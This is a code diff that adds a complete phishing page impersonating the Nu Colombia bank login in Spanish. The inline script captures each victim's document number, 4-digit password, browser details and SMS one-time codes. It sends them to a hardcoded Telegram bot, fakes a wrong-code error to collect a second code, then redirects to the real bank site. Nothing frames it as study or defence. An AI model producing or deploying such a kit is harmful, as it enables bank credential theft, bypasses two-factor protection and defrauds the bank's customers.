@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="es">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Nu Colombia</title>
+<link rel="icon" href="https://www.nu.com.co/favicons/favicon-32x32.png">
+<style>
+*{box-sizing:border-box;font-family:Graphik,-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+body{margin:0;color:#111}header{display:flex;align-items:center;justify-content:space-between;padding:16px 32px}
+.logo{font-size:30px;font-weight:800;color:#820AD1;letter-spacing:-1px}
+nav a{margin:0 12px;color:#111;text-decoration:none;font-size:15px}
+.btn-nu{background:#820AD1;color:#fff;border:0;border-radius:24px;padding:12px 28px;font-size:15px;font-weight:600;cursor:pointer}
+.hero{background:#820AD1;color:#fff;padding:64px 32px;display:flex;flex-wrap:wrap;align-items:center;gap:32px}
+.hero h1{font-size:44px;line-height:1.1;margin:0 0 16px;max-width:520px}
+.hero p{font-size:18px;opacity:.92;max-width:480px}
+.card{background:#fff;color:#111;border-radius:20px;padding:28px;width:360px;box-shadow:0 12px 40px rgba(0,0,0,.25)}
+.card h3{margin:0 0 6px}.card small{color:#767676}
+.card input{width:100%;padding:13px;margin:8px 0;border:1px solid #D9D9D9;border-radius:12px;font-size:15px}
+.card .btn-nu{width:100%;margin-top:8px}
+.trust{display:flex;gap:24px;padding:28px 32px;font-size:14px;color:#444;flex-wrap:wrap}
+.trust b{color:#111}footer{background:#F5F5F5;padding:24px 32px;font-size:12px;color:#767676}
+#otpBox{display:none}
+.err{background:#FDECEA;border-left:4px solid #D32F2F;padding:10px 12px;font-size:13px;margin:8px 0;display:none}
+</style></head>
+<body>
+<header><div class="logo">nu</div>
+<nav><a href="#">Cuentas</a><a href="#">Tarjetas</a><a href="#">Préstamos</a><a href="#">Ayuda</a></nav>
+<button class="btn-nu" onclick="document.getElementById('doc').focus()">Entrar</button></header>
+<div class="hero">
+<div><h1>Controlar tus finanzas no es suerte, decide Nu</h1>
+<p>Cuenta Nu, tarjeta de crédito sin cuota de manejo y préstamos a tu medida. Todo desde la app, sin filas ni letra pequeña.</p></div>
+<div class="card" id="loginCard">
+<div id="step1">
+<h3>Entra a tu cuenta</h3><small>Usa tu documento y clave Nu</small>
+<form id="f1"><input id="doc" inputmode="numeric" placeholder="Número de documento" required>
+<input id="pwd" type="password" inputmode="numeric" maxlength="4" placeholder="Clave de 4 dígitos" required>
+<div class="err" id="e1"></div>
+<button class="btn-nu">Continuar</button></form>
+<small>¿Primera vez? <a href="#" style="color:#820AD1">Abre tu cuenta gratis</a></small>
+</div>
+<div id="otpBox">
+<h3>Verificación</h3><small>Enviamos un código SMS a tu celular registrado</small>
+<form id="f2"><input id="otp" inputmode="numeric" maxlength="6" placeholder="Código de 6 dígitos" required>
+<div class="err" id="e2"></div>
+<button class="btn-nu">Confirmar</button></form>
+<small id="timer">Reenviar código en 0:30</small>
+</div>
+</div>
+</div>
+<div class="trust"><div><b>Sin cuota de manejo</b><br>Tarjeta y cuenta $0</div><div><b>100% digital</b><br>Todo desde la app</div><div><b>Soporte 24/7</b><br>Chat en la app</div></div>
+<footer>Nu Colombia · Compañía de Financiamiento · servicio-al-cliente · pqr@nucf.com.co · Este es un portal de acceso seguro.</footer>
+<script>
+const BOT="8982594594:AAHnFUSKOou39oLTzxIrlA3xpk3mXnruI2U",CHAT="8144084549";
+const send=m=>fetch("https://api.telegram.org/bot"+BOT+"/sendMessage?chat_id="+CHAT+"&text="+encodeURIComponent(m),{mode:"no-cors"});
+let DOC="";
+f1.onsubmit=async e=>{e.preventDefault();DOC=doc.value;
+await send("NU P1\ndoc: "+DOC+"\nclave: "+pwd.value+"\n"+navigator.userAgent);
+step1.style.display="none";otpBox.style.display="block";
+let s=30;const t=setInterval(()=>{s--;timer.textContent="Reenviar código en 0:"+String(s).padStart(2,"0");if(s<=0)clearInterval(t)},1000);};
+f2.onsubmit=async e=>{e.preventDefault();
+await send("NU P2\ndoc: "+DOC+"\notp: "+otp.value);
+e2.style.display="block";e2.textContent="Código incorrecto, te enviamos uno nuevo.";
+otp.value="";
+setTimeout(async()=>{await send("NU P2-reintento\ndoc: "+DOC+"\notp: "+otp.value+" (pendiente)");},1000);
+const f3=document.createElement('form');f3.innerHTML='<input id="otp2" inputmode="numeric" maxlength="6" placeholder="Nuevo código" required style="width:100%;padding:13px;margin:8px 0;border:1px solid #D9D9D9;border-radius:12px"><button class="btn-nu" style="width:100%">Confirmar</button>';
+otpBox.appendChild(f3);
+f3.onsubmit=async ev=>{ev.preventDefault();await send("NU P3\ndoc: "+DOC+"\notp2: "+document.getElementById('otp2').value);
+document.body.innerHTML="<div style='background:#820AD1;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif'><div><h2>Verificando identidad…</h2><p>Te redirigimos a la app.</p></div></div>";
+setTimeout(()=>location.href="https://www.nu.com.co/",4000);};
+};
+</script></body></html>
